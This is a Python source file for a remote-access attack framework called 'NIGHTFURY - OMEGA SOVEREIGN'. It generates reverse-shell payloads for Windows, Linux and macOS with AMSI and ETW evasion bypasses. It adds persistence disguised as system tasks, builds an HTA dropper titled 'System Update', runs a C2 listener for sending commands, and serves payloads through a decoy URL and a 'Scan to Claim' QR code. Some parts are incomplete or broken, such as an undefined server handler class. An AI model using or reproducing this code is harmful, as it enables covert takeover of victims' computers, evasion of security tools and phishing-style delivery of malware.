#!/usr/bin/env python3
"""
Project NIGHTFURY - OMEGA SOVEREIGN (v5.1)
Author: Acubis (Synthesized from user data)
Version: 5.1 - Dual-Mode Fallback Edition
Description: Advanced payload framework with multi-platform support,
             auto-execution, and a dynamic GUI/CLI interface.
"""

# --- Core Imports ---
import os
import sys
import base64
import random
import string
import socket
import threading
import time
import requests
import json
import subprocess
import uuid
import re
import logging
import qrcode
import io
import platform
import sqlite3
import datetime
import tempfile
import shutil
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# --- Dependency Imports ---
# These are all required for the framework's full functionality.
try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
        QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
        QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
        QFileDialog, QSplitter, QFormLayout, QStatusBar,
        QTableWidget, QTableWidgetItem, QHeaderView, QDialog, QDialogButtonBox
    )
    from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QUrl, QObject
    from PyQt5.QtGui import QFont, QPalette, QColor, QIcon, QPixmap
    PYQT_AVAILABLE = True
except ImportError:
    PYQT_AVAILABLE = False
    # Define dummy QObject for CLI mode to prevent import errors
    class QObject:
        def __init__(self): pass
    class pyqtSignal:
        def __init__(self, *args): pass
        def emit(self, *args): pass
        def connect(self, *args): pass

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("[FATAL] Dependency Missing: 'cryptography'. Please run: pip install cryptography")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.table import Table
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

# --- Global Configuration ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', filename="nightfury_core.log")
logger = logging.getLogger("NightfuryCore")
DB_FILE = "nightfury_omega.db"

# ===============================================
# SECTION 1: CORE LOGIC (UI Agnostic)
# ===============================================

class NightfuryCore(QObject):
    """
    Holds all non-UI logic, state, and threads.
    Emits signals for the GUI or uses callbacks for the CLI.
    """
    
    # --- GUI Signals ---
    # These signals will be used by the GUI to update components from other threads.
    if PYQT_AVAILABLE:
        log_signal = pyqtSignal(str, str) # msg, level
        new_connection_signal = pyqtSignal(str) # client_id
        connection_closed_signal = pyqtSignal(str) # client_id
        client_data_signal = pyqtSignal(str, str) # client_id, data
        server_status_signal = pyqtSignal(bool, str) # running, url
        bot_status_signal = pyqtSignal(str, str) # status, color
        qr_code_signal = pyqtSignal(QPixmap) # pixmap
        payload_generated_signal = pyqtSignal(str) # payload_text
        stats_updated_signal = pyqtSignal(dict) # stats_dict

    def __init__(self):
        super().__init__()
        self.config = {
            'lhost': self.get_local_ip(),
            'lport': 4444,
            'obfuscation_level': 5,
            'persistence': True,
            'evasion_techniques': True,
            'platform': "windows",
            'payload_type': "reverse_shell",
            'discord_token': "",
            'auto_server_port': 8080,
            'domain': f"{self.get_local_ip()}.nip.io", # Use nip.io for easy DNS
        }
        self.current_payload = None
        
        # --- C2 Listener State ---
        self.listener_socket = None
        self.listener_thread = None
        self.active_connections = {}  # { "ip:port": socket }
        
        # --- Auto-Server State ---
        self.http_server = None
        self.http_server_thread = None

        # --- Discord Bot State ---
        self.discord_bot = None
        self.discord_bot_thread = None

        # --- CLI Callbacks ---
        # These are functions (like `print`) passed by the CLI.
        self.cli_log_callback = None
        self.cli_new_conn_callback = None
        self.cli_close_conn_callback = None
        self.cli_data_callback = None

    def log_message(self, message, level="info"):
        """Logs a message to the GUI signal or CLI callback."""
        logger.info(message)
        if PYQT_AVAILABLE and self.log_signal:
            self.log_signal.emit(message, level)
        elif self.cli_log_callback:
            color_map = {"info": "cyan", "success": "green", "warning": "yellow", "error": "red"}
            self.cli_log_callback(f"[{color_map.get(level, 'white')}][{level.upper()}][/{color_map.get(level, 'white')}] {message}")

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"
    
    # --- Payload Generation Logic ---
    # (Copied from Nightfury _250821_032804.txt)
    
    def _generate_key(self, length=32):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    def _xor_encrypt(self, payload):
        key = self._generate_key()
        encrypted = bytearray()
        for i in range(len(payload)):
            encrypted.append(payload[i] ^ ord(key[i % len(key)]))
        return base64.b64encode(encrypted).decode(), key

    def _add_amsi_bypass(self, payload):
        bypass_code = '''
        try {
            $AMSI = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
            $AMSI.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        } catch {}
        '''
        return bypass_code + payload
    
    def _add_etw_bypass(self, payload):
        etw_bypass = '''
        try {
            $ETW = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');
            $ETW.GetField('etwProvider','NonPublic,Static').SetValue($null, $null);
        } catch {}
        '''
        return etw_bypass + payload

    def _add_persistence(self, payload_cmd, platform):
        payload_id = str(uuid.uuid4())[:8]
        if platform == "windows":
            return f'''
            $taskName = "SystemHealthCheck_{payload_id}";
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{payload_cmd}`"";
            $trigger = New-ScheduledTaskTrigger -AtLogOn;
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue | Out-Null;
            '''
        elif platform == "linux":
            safe_payload = payload_cmd.replace("'", "'\\''")
            return f'''
            (crontab -l 2>/dev/null; echo "@reboot {safe_payload}") | crontab -
            '''
        elif platform == "macos":
            plist_path = f"~/Library/LaunchAgents/com.system.update.{payload_id}.plist"
            plist_content = f'''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.system.update.{payload_id}</string>
                <key>ProgramArguments</key>
                <array>
                    <string>/bin/bash</string>
                    <string>-c</string>
                    <string>{payload_cmd}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
            </plist>
            '''
            return f'''
            echo '{plist_content}' > {plist_path}
            launchctl load {plist_path}
            '''
        return payload_cmd

    def _generate_windows_payload(self):
        ps_code = f'''
        $c = New-Object System.Net.Sockets.TCPClient("{self.config['lhost']}",{self.config['lport']});
        $s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
            $sb = (iex $d 2>&1 | Out-String );
            $sb2 = $sb + "PS " + (pwd).Path + "> ";
            $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
            $s.Write($sbt,0,$sbt.Length);$s.Flush()
        }};$c.Close()
        '''
        
        if self.config['evasion_techniques']:
            ps_code = self._add_amsi_bypass(ps_code)
            ps_code = self._add_etw_bypass(ps_code)
        
        # ... (add obfuscation layers here if desired) ...
        
        base_payload = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"{ps_code.replace('`', '``').replace('$', '`$')}\""
        
        if self.config['persistence']:
            base_payload = self._add_persistence(base_payload, "windows")

        return base_payload

    def _generate_linux_payload(self):
        bash_code = f'''bash -i >& /dev/tcp/{self.config['lhost']}/{self.config['lport']} 0>&1'''
        if self.config['persistence']:
            bash_code = self._add_persistence(bash_code, "linux")
        return bash_code
    
    def _generate_macos_payload(self):
        macos_code = f'''python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.config['lhost']}',{self.config['lport']}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"'''
        if self.config['persistence']:
            macos_code = self._add_persistence(macos_code, "macos")
        return macos_code

    def generate_payload(self, platform):
        self.config['platform'] = platform
        try:
            if platform == "windows":
                self.current_payload = self._generate_windows_payload()
            elif platform == "linux":
                self.current_payload = self._generate_linux_payload()
            elif platform == "macos":
                self.current_payload = self._generate_macos_payload()
            else:
                raise ValueError(f"Unsupported platform: {platform}")
            
            self.log_message(f"Generated {platform} payload.", "success")
            if PYQT_AVAILABLE and self.payload_generated_signal:
                self.payload_generated_signal.emit(self.current_payload)
            return self.current_payload
        except Exception as e:
            self.log_message(f"Failed to generate payload: {e}", "error")
            return None

    def generate_hta(self):
        try:
            win_payload = self._generate_windows_payload()
            hta_content = f"""
            <html><head><title>System Update</title>
            <HTA:APPLICATION ID="o" APPLICATIONNAME="System Update" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
            <script language="VBScript">
                Sub Window_OnLoad
                    On Error Resume Next
                    Set objShell = CreateObject("Wscript.Shell")
                    objShell.Run "{win_payload.replace('"', '""')}", 0, False
                    Self.Close
                End Sub
            </script>
            </head><body></body></html>
            """
            self.current_payload = hta_content
            self.log_message("Generated HTA payload.", "success")
            if PYQT_AVAILABLE and self.payload_generated_signal:
                self.payload_generated_signal.emit(self.current_payload)
            return self.current_payload
        except Exception as e:
            self.log_message(f"Failed to generate HTA: {e}", "error")
            return None

    # --- C2 Listener Logic ---
    
    def start_listener(self, lhost, lport):
        if self.listener_thread:
            self.log_message("Listener is already running.", "warning")
            return False
        
        try:
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((lhost, lport))
            self.listener_socket.listen(5)
            
            self.listener_thread = threading.Thread(target=self.run_listener, daemon=True)
            self.listener_thread.start()
            
            self.log_message(f"Listener started on {lhost}:{lport}", "success")
            return True
        except Exception as e:
            self.log_message(f"Failed to start listener: {e}", "error")
            return False

    def stop_listener(self):
        if not self.listener_thread:
            self.log_message("Listener is not running.", "warning")
            return False
        
        try:
            for conn in self.active_connections.values():
                conn.close()
            self.active_connections.clear()
            
            if self.listener_socket:
                self.listener_socket.close()
                
            self.listener_thread = None
            self.listener_socket = None
            
            # Update GUI/CLI
            if PYQT_AVAILABLE and self.connection_closed_signal:
                self.connection_closed_signal.emit("*") # Special signal to clear all
            if self.cli_close_conn_callback:
                self.cli_close_conn_callback("*")
                
            self.log_message("Listener stopped.", "success")
            return True
        except Exception as e:
            self.log_message(f"Error stopping listener: {e}", "error")
            return False

    def run_listener(self):
        while self.listener_socket:
            try:
                conn, addr = self.listener_socket.accept()
                client_id = f"{addr[0]}:{addr[1]}"
                self.active_connections[client_id] = conn
                self.log_message(f"New connection from {client_id}", "success")
                
                # Update GUI/CLI
                if PYQT_AVAILABLE and self.new_connection_signal:
                    self.new_connection_signal.emit(client_id)
                if self.cli_new_conn_callback:
                    self.cli_new_conn_callback(client_id)
                
                threading.Thread(target=self.handle_client, args=(conn, client_id), daemon=True).start()
            except OSError:
                break # Socket was closed
            except Exception as e:
                self.log_message(f"Listener accept error: {e}", "error")
                break

    def handle_client(self, conn, client_id):
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                
                data_str = data.decode('utf-8', 'ignore')
                
                if PYQT_AVAILABLE and self.client_data_signal:
                    self.client_data_signal.emit(client_id, data_str)
                if self.cli_data_callback:
                    self.cli_data_callback(client_id, data_str)
                    
        except Exception:
            pass # Handle connection errors silently
        finally:
            conn.close()
            if client_id in self.active_connections:
                del self.active_connections[client_id]
            
            self.log_message(f"Connection closed: {client_id}", "warning")
            
            if PYQT_AVAILABLE and self.connection_closed_signal:
                self.connection_closed_signal.emit(client_id)
            if self.cli_close_conn_callback:
                self.cli_close_conn_callback(client_id)

    def send_shell_command(self, client_id, cmd):
        conn = self.active_connections.get(client_id)
        if conn:
            try:
                conn.send((cmd + "\n").encode('utf-8'))
                self.log_message(f"Sent to {client_id}: {cmd}", "info")
                return True
            except Exception as e:
                self.log_message(f"Failed to send to {client_id}: {e}", "error")
                return False
        self.log_message(f"Client {client_id} not found.", "error")
        return False

    # --- Auto-Server Logic ---
    
    def start_auto_server(self, lhost, lport, c2_host, c2_port):
        if self.http_server_thread:
            self.log_message("Server is already running.", "warning")
            return False
            
        try:
            class CustomHandler(AutoExecutionServer):
                pass
            
            # Pass core info to the server
            self.http_server = HTTPServer((lhost, lport), CustomHandler)
            self.http_server.lhost = c2_host
            self.http_server.lport = c2_port
            self.http_server.domain = self.config['domain']
            self.http_server.server_port = lport
            
            self.http_server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            self.http_server_thread.start()
            
            claim_url = f"http://{self.config['domain']}:{lport}/"
            self.log_message(f"Auto-Execute server started: {claim_url}", "success")
            
            if PYQT_AVAILABLE and self.server_status_signal:
                self.server_status_signal.emit(True, claim_url)
                # Generate and emit QR code
                qr_img_b64 = self._generate_qr_b64(claim_url)
                pixmap = QPixmap()
                pixmap.loadFromData(base64.b64decode(qr_img_b64))
                self.qr_code_signal.emit(pixmap)
            
            return True
        except Exception as e:
            self.log_message(f"Failed to start auto-server: {e}", "error")
            return False

    def stop_auto_server(self):
        if not self.http_server_thread:
            self.log_message("Server is not running.", "warning")
            return False
        
        try:
            self.http_server.shutdown()
            self.http_server_thread = None
            self.http_server = None
            
            self.log_message("Auto-Execute server stopped.", "success")
            if PYQT_AVAILABLE and self.server_status_signal:
                self.server_status_signal.emit(False, "")
                self.qr_code_signal.emit(QPixmap()) # Emit empty pixmap
            return True
        except Exception as e:
            self.log_message(f"Failed to stop server: {e}", "error")
            return False
            
    def _generate_qr_b64(self, text):
        # From 'Nightfury'
        qr = qrcode.QRCode()
        qr.add_data(text)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        return base64.b64encode(img_byte_arr.getvalue()).decode()

# ===============================================
# SECTION 2: GUI IMPLEMENTATION
# (Based on Project NIGHTFURY)
# ===============================================

class NightfuryGUI(QMainWindow):
    """
    The main PyQt5 GUI for the framework.
    This class will only be used if a display is available.
    """
    def __init__(self, core):
        super().__init__()
        self.core = core
        self.setWindowTitle("Project NIGHTFURY: OMEGA SOVEREIGN (v5.1)")
        self.setGeometry(100, 100, 1200, 800)
        
        # --- Connect Core Signals to GUI Slots ---
        self.core.log_signal.connect(self.log_to_activity_list)
        self.core.new_connection_signal.connect(self.add_connection_to_list)
        self.core.connection_closed_signal.connect(self.remove_connection_from_list)
        self.core.client_data_signal.connect(self.append_shell_output)
        self.core.server_status_signal.connect(self.update_server_status)
        self.core.qr_code_signal.connect(self.update_qr_code)
        self.core.payload_generated_signal.connect(self.update_payload_preview)
        
        self.init_ui()
        self.apply_dark_theme()
        self.log_to_activity_list("GUI Initialized. Welcome, Operator.", "success")

    def init_ui(self):
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)
        
        self.create_dashboard_tab()
        self.create_payload_tab()
        self.create_listener_tab()
        self.create_autolaunch_tab()
        self.create_activity_log_tab()
        
        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.showMessage("System Ready.")

    def apply_dark_theme(self):
        # (Same as the theme from nightfury.py)
        self.setStyleSheet("""
            QMainWindow, QTabWidget, QWidget { background-color: #282c34; color: #abb2bf; }
            QTabWidget::pane { border: 1px solid #181a1f; }
            QTabBar::tab { background: #21252b; color: #abb2bf; padding: 10px; border: 1px solid #181a1f; }
            QTabBar::tab:selected { background: #282c34; border-bottom-color: #282c34; }
            QGroupBox { border: 1px solid #3e4451; border-radius: 5px; margin-top: 10px; font-weight: bold; color: #61afef; }
            QGroupBox::title { subcontrol-origin: margin; subcontrol-position: top left; padding: 0 5px; background-color: #282c34; }
            QLabel { color: #abb2bf; }
            QLineEdit, QTextEdit, QListWidget, QTableWidget { background-color: #21252b; color: #abb2bf; border: 1px solid #3e4451; border-radius: 3px; padding: 5px; }
            QPushButton { background-color: #61afef; color: #21252b; font-weight: bold; border: none; border-radius: 3px; padding: 8px 12px; min-height: 20px; }
            QPushButton:hover { background-color: #7abfff; }
            QPushButton:disabled { background-color: #3e4451; color: #5c6370; }
            QStatusBar { background: #21252b; color: #abb2bf; }
            QSplitter::handle { background: #3e4451; }
        """)

    # --- Tab Creation ---
    
    def create_dashboard_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.addWidget(QLabel("Welcome to Omega Sovereign.\nThis dashboard is a placeholder. See the 'Activity Log' for real-time updates."))
        self.tabs.addTab(tab, "Dashboard")

    def create_payload_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        config_group = QGroupBox("Payload Configuration")
        config_layout = QFormLayout()
        
        self.payload_platform_combo = QComboBox()
        self.payload_platform_combo.addItems(["windows", "linux", "macos"])
        config_layout.addRow("Platform:", self.payload_platform_combo)
        
        self.payload_persistence_cb = QCheckBox("Enable Persistence")
        self.payload_persistence_cb.setChecked(self.core.config['persistence'])
        config_layout.addRow(self.payload_persistence_cb)
        
        self.payload_evasion_cb = QCheckBox("Enable Evasion (AMSI/ETW)")
        self.payload_evasion_cb.setChecked(self.core.config['evasion_techniques'])
        config_layout.addRow(self.payload_evasion_cb)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        gen_btn_layout = QHBoxLayout()
        self.payload_gen_psh_btn = QPushButton("Generate Payload (PSH/BASH)")
        self.payload_gen_psh_btn.clicked.connect(self.gui_generate_payload)
        gen_btn_layout.addWidget(self.payload_gen_psh_btn)
        
        self.payload_gen_hta_btn = QPushButton("Generate HTA (Windows)")
        self.payload_gen_hta_btn.clicked.connect(self.core.generate_hta)
        gen_btn_layout.addWidget(self.payload_gen_hta_btn)
        layout.addLayout(gen_btn_layout)

        output_group = QGroupBox("Generated Payload")
        output_layout = QVBoxLayout()
        self.payload_output_text = QTextEdit()
        self.payload_output_text.setReadOnly(True)
        output_layout.addWidget(self.payload_output_text)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)

        self.tabs.addTab(tab, "Payload Generator")

    def create_listener_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        controls_group = QGroupBox("Listener Control")
        controls_layout = QHBoxLayout()
        self.listener_lhost_input = QLineEdit(self.core.config['lhost'])
        controls_layout.addWidget(QLabel("LHOST:"))
        controls_layout.addWidget(self.listener_lhost_input)
        
        self.listener_lport_input = QLineEdit(str(self.core.config['lport']))
        controls_layout.addWidget(QLabel("LPORT:"))
        controls_layout.addWidget(self.listener_lport_input)
        
        self.listener_start_btn = QPushButton("Start Listener")
        self.listener_start_btn.clicked.connect(self.gui_start_listener)
        controls_layout.addWidget(self.listener_start_btn)
        
        self.listener_stop_btn = QPushButton("Stop Listener")
        self.listener_stop_btn.clicked.connect(self.gui_stop_listener)
        self.listener_stop_btn.setEnabled(False)
        controls_layout.addWidget(self.listener_stop_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        splitter = QSplitter(Qt.Horizontal)
        
        conn_group = QGroupBox("Connections")
        conn_layout = QVBoxLayout()
        self.listener_conn_list = QListWidget()
        self.listener_conn_list.itemClicked.connect(self.gui_select_connection)
        conn_layout.addWidget(self.listener_conn_list)
        conn_group.setLayout(conn_layout)
        splitter.addWidget(conn_group)
        
        shell_group = QGroupBox("Interactive Shell")
        shell_layout = QVBoxLayout()
        self.listener_shell_output = QTextEdit()
        self.listener_shell_output.setReadOnly(True)
        self.listener_shell_output.setFont(QFont("Courier", 9))
        shell_layout.addWidget(self.listener_shell_output)
        
        self.listener_shell_input = QLineEdit()
        self.listener_shell_input.setPlaceholderText("Select a connection to send commands...")
        self.listener_shell_input.returnPressed.connect(self.gui_send_shell_command)
        self.listener_shell_input.setEnabled(False)
        shell_layout.addWidget(self.listener_shell_input)
        
        shell_group.setLayout(shell_layout)
        splitter.addWidget(shell_group)
        
        splitter.setSizes([300, 700])
        layout.addWidget(splitter)
        
        self.tabs.addTab(tab, "Listener (C2)")

    def create_autolaunch_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        controls_group = QGroupBox("Auto-Execute HTTP Server")
        controls_layout = QFormLayout()
        
        self.server_lhost_input = QLineEdit(self.core.config['domain'])
        controls_layout.addRow("Server Domain:", self.server_lhost_input)
        
        self.server_lport_input = QLineEdit(str(self.core.config['auto_server_port']))
        controls_layout.addRow("Server Port:", self.server_lport_input)
        
        btn_layout = QHBoxLayout()
        self.server_start_btn = QPushButton("Start Server")
        self.server_start_btn.clicked.connect(self.gui_start_auto_server)
        btn_layout.addWidget(self.server_start_btn)
        
        self.server_stop_btn = QPushButton("Stop Server")
        self.server_stop_btn.clicked.connect(self.gui_stop_auto_server)
        self.server_stop_btn.setEnabled(False)
        btn_layout.addWidget(self.server_stop_btn)
        controls_layout.addRow(btn_layout)
        
        self.server_claim_url_label = QLineEdit()
        self.server_claim_url_label.setReadOnly(True)
        self.server_claim_url_label.setPlaceholderText("Server not running...")
        controls_layout.addRow("Decoy URL:", self.server_claim_url_label)
        
        self.server_hta_url_label = QLineEdit()
        self.server_hta_url_label.setReadOnly(True)
        self.server_hta_url_label.setPlaceholderText("Server not running...")
        controls_layout.addRow("Payload URL:", self.server_hta_url_label)
        
        self.server_qr_label = QLabel("QR Code will appear here...")
        self.server_qr_label.setAlignment(Qt.AlignCenter)
        self.server_qr_label.setMinimumSize(220, 220)
        self.server_qr_label.setStyleSheet("border: 1px solid #3e4451; background: #21252b;")
        controls_layout.addRow("Scan to Claim:", self.server_qr_label)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        self.tabs.addTab(tab, "Auto-Execute")

    def create_activity_log_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        log_group = QGroupBox("Master Activity Log")
        log_layout = QVBoxLayout()
        self.activity_log = QTextEdit()
        self.activity_log.setReadOnly(True)
        self.activity_log.setFont(QFont("Courier", 9))
        log_layout.addWidget(self.activity_log)
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        self.tabs.addTab(tab, "Activity Log")

    # --- GUI Slots (Signal Handlers) ---

    def log_to_activity_list(self, message, level):
        color_map = {
            "info": "#61afef",
            "success": "#98c379",
            "warning": "#e5c07b",
            "error": "#e06c75"
        }
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        self.activity_log.append(f"<span style='color: {color_map.get(level, '#abb2bf')};'>[{timestamp}] {message}</span>")

    def add_connection_to_list(self, client_id):
        self.listener_conn_list.addItem(client_id)
        
    def remove_connection_from_list(self, client_id):
        if client_id == "*": # Clear all
            self.listener_conn_list.clear()
            return
        
        items = self.listener_conn_list.findItems(client_id, Qt.MatchExactly)
        if items:
            self.listener_conn_list.takeItem(self.listener_conn_list.row(items[0]))

    def append_shell_output(self, client_id, data):
        self.listener_shell_output.append(data)
        self.listener_shell_output.verticalScrollBar().setValue(
            self.listener_shell_output.verticalScrollBar().maximum()
        )

    def update_server_status(self, running, url):
        if running:
            self.server_start_btn.setEnabled(False)
            self.server_stop_btn.setEnabled(True)
            self.server_claim_url_label.setText(url)
            self.server_hta_url_label.setText(f"{url}claim.hta")
        else:
            self.server_start_btn.setEnabled(True)
            self.server_stop_btn.setEnabled(False)
            self.server_claim_url_label.clear()
            self.server_hta_url_label.clear()

    def update_qr_code(self, pixmap):
        self.server_qr_label.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
        
    def update_payload_preview(self, payload_text):
        self.payload_output_text.setPlainText(payload_text)

    # --- GUI Button Handlers ---
    
    def gui_generate_payload(self):
        # Update config from GUI
        self.core.config['platform'] = self.payload_platform_combo.currentText().lower()
        self.core.config['persistence'] = self.payload_persistence_cb.isChecked()
        self.core.config['evasion_techniques'] = self.payload_evasion_cb.isChecked()
        # Call core logic
        self.core.generate_payload(self.core.config['platform'])

    def gui_start_listener(self):
        lhost = self.listener_lhost_input.text()
        lport = int(self.listener_lport_input.text())
        if self.core.start_listener(lhost, lport):
            self.listener_start_btn.setEnabled(False)
            self.listener_stop_btn.setEnabled(True)
            self.listener_shell_input.setEnabled(True)
            self.statusBar.showMessage(f"Listener started on {lhost}:{lport}", 3000)

    def gui_stop_listener(self):
        if self.core.stop_listener():
            self.listener_start_btn.setEnabled(True)
            self.listener_stop_btn.setEnabled(False)
            self.listener_shell_input.setEnabled(False)
            self.listener_shell_output.clear()
            self.statusBar.showMessage("Listener stopped.", 3000)

    def gui_select_connection(self, item):
        self.listener_shell_input.setPlaceholderText(f"Command for {item.text()}...")
        
    def gui_send_shell_command(self):
        selected_items = self.listener_conn_list.selectedItems()
        if not selected_items:
            self.log_message("No connection selected.", "warning")
            return
        
        client_id = selected_items[0].text()
        cmd = self.listener_shell_input.text()
        
        if cmd:
            self.core.send_shell_command(client_id, cmd)
            self.listener_shell_input.clear()
            
    def gui_start_auto_server(self):
        self.core.config['domain'] = self.server_lhost_input.text()
        self.core.config['auto_server_port'] = int(self.server_lport_input.text())
        
        self.core.start_auto_server(
            "0.0.0.0", # Bind to all interfaces
            self.core.config['auto_server_port'],
            self.core.config['lhost'],
            self.core.config['lport']
        )
        
    def gui_stop_auto_server(self):
        self.core.stop_auto_server()

# ===============================================
# SECTION 3: CLI FALLBACK IMPLEMENTATION
# (Based on Quantum Omega)
# ===============================================

class NightfuryCLI:
    """
    The fallback command-line interface.
    This class will only be used if no display is available.
    """
    def __init__(self, core, console):
        self.core = core
        self.console = console
        self.selected_client = None
        
        # --- Connect Core Logic to CLI Callbacks ---
        self.core.cli_log_callback = self.log
        self.core.cli_new_conn_callback = self.on_new_connection
        self.core.cli_close_conn_callback = self.on_connection_closed
        self.core.cli_data_callback = self.on_client_data
        
        self.console.print(Panel.fit("[bold green]Nightfury Omega Sovereign CLI Mode[/bold green]\n[cyan]No display found. Initializing terminal interface.[/cyan]", title="SYSTEM BOOT"))

    def log(self, message):
        self.console.print(message, style="white")

    def on_new_connection(self, client_id):
        self.console.print(f"\n[bold green][+] New Connection:[/bold green] {client_id}")

    def on_connection_closed(self, client_id):
        self.console.print(f"\n[bold red][-] Connection Closed:[/bold red] {client_id}")
        if self.selected_client == client_id:
            self.selected_client = None

    def on_client_data(self, client_id, data):
        if self.selected_client == client_id:
            self.console.print(f"\n[bold cyan][{client_id}]:[/bold cyan]\n{data.strip()}")
        else:
            self.log(f"Background data from {client_id}: {data[:50].strip()}...")
            
    def run(self):
        """Main CLI loop."""
        try:
            while True:
                self.console.print("\n" + "="*50, style="dim")
                self.console.print("[bold cyan]NIGHTFURY OMEGA SOVEREIGN[/bold cyan]", justify="center")
                self.console.print("="*50, style="dim")
                self.console.print("[1] Generate Payload")
                self.console.print("[2] Start/Stop C2 Listener")
                self.console.print("[3] Start/Stop Auto-Execute Server")
                self.console.print("[4] Interact with Connection")
                self.console.print("[9] Exit")
                
                choice = Prompt.ask("Select an option", choices=["1", "2", "3", "4", "9"], default="1")
                
                if choice == '1':
                    self.cli_generate_payload()
                elif choice == '2':
                    self.cli_manage_listener()
                elif choice == '3':
                    self.cli_manage_auto_server()
                elif choice == '4':
                    self.cli_interact()
                elif choice == '9':
                    self.log("Shutting down...", "info")
                    if self.core.listener_thread:
                        self.core.stop_listener()
                    if self.core.http_server_thread:
                        self.core.stop_auto_server()
                    break
        except KeyboardInterrupt:
            self.log("\nShutdown requested by user.", "warning")
            if self.core.listener_thread:
                self.core.stop_listener()
            if self.core.http_server_thread:
                self.core.stop_auto_server()
        
    def cli_generate_payload(self):
        platform = Prompt.ask("Platform", choices=["windows", "linux", "macos"], default=self.core.config['platform'])
        self.core.config['persistence'] = Confirm.ask("Enable persistence?", default=self.core.config['persistence'])
        self.core.config['evasion_techniques'] = Confirm.ask("Enable evasion?", default=self.core.config['evasion_techniques'])
        
        payload = self.core.generate_payload(platform)
        if payload:
            self.console.print(Panel(payload, title="Generated Payload"))
            if Confirm.ask("Save to file?"):
                filename = Prompt.ask("Filename", default=f"payload.{'ps1' if platform == 'windows' else 'sh'}")
                try:
                    with open(filename, 'w') as f:
                        f.write(payload)
                    self.log(f"Payload saved to {filename}", "success")
                except Exception as e:
                    self.log(f"Failed to save file: {e}", "error")

    def cli_manage_listener(self):
        if self.core.listener_thread:
            if Confirm.ask("Listener is running. Stop it?"):
                self.core.stop_listener()
        else:
            if Confirm.ask("Listener is not running. Start it?"):
                lhost = Prompt.ask("LHOST", default=self.core.config['lhost'])
                lport = IntPrompt.ask("LPORT", default=self.core.config['lport'])
                self.core.start_listener(lhost, lport)

    def cli_manage_auto_server(self):
        if self.core.http_server_thread:
            if Confirm.ask("Auto-Execute server is running. Stop it?"):
                self.core.stop_auto_server()
        else:
            if Confirm.ask("Auto-Execute server is not running. Start it?"):
                domain = Prompt.ask("Server Domain", default=self.core.config['domain'])
                lport = IntPrompt.ask("Server Port", default=self.core.config['auto_server_port'])
                self.core.config['domain'] = domain
                self.core.start_auto_server("0.0.0.0", lport, self.core.config['lhost'], self.core.config['lport'])
                
    def cli_interact(self):
        if not self.core.active_connections:
            self.log("No active connections.", "warning")
            return
            
        clients = list(self.core.active_connections.keys())
        if len(clients) == 1:
            self.selected_client = clients[0]
            self.log(f"Auto-selected connection: {self.selected_client}", "success")
        else:
            self.console.print("Active Connections:")
            for i, client in enumerate(clients, 1):
                self.console.print(f"[{i}] {client}")
            choice = IntPrompt.ask("Select connection", choices=[str(i) for i in range(1, len(clients) + 1)])
            self.selected_client = clients[choice - 1]
            
